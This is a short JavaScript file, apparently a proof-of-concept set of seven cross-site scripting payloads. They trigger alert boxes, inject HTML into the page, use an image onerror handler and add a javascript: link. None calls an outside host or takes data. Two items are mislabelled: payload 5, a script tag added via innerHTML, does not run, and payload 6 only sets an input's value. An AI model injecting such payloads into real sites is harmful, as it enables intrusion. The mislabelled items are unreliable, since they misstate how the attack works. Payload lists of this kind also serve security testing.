// Payload 1: Simple XSS alert
alert('XSS Payload 1 Triggered');

// Payload 2: Another alert with a different method
setTimeout(function() {
    alert('XSS Payload 2 Triggered');
}, 1000);

// Payload 3: DOM manipulation XSS
document.body.innerHTML += '<h1>Injected Content</h1>';

// Payload 4: Event-based XSS (Image-based)
var img = document.createElement('img');
img.src = 'x';
img.onerror = function() {
    alert('Image-based XSS Triggered');
};
document.body.appendChild(img);

// Payload 5: Another DOM injection with JavaScript execution
document.body.innerHTML += '<script>alert("XSS Payload 5 Triggered")</script>';

// Payload 6: Triggering XSS through a form input
var input = document.createElement('input');
input.value = '<script>alert("XSS Payload 6 Triggered")</script>';
document.body.appendChild(input);

// Payload 7: XSS via an anchor tag with JavaScript
var anchor = document.createElement('a');
anchor.href = 'javascript:alert("XSS Payload 7 Triggered")';
anchor.innerText = 'Click me to trigger XSS';
document.body.appendChild(anchor);
